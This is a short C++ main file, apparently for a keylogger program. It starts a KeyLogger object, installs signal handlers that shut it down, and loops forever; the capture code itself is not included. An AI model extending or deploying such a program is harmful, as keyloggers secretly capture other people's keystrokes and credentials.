#include "keylogger.h"
#include <iostream>
#include <csignal>

KeyLogger* logger = nullptr;

void signalHandler(int signum) {
    if (logger) {
        logger->stop();
        delete logger;
    }
    exit(signum);
}

int main() {
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    logger = new KeyLogger();
    logger->start();
    
    // 保持程序运行
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    return 0;
}
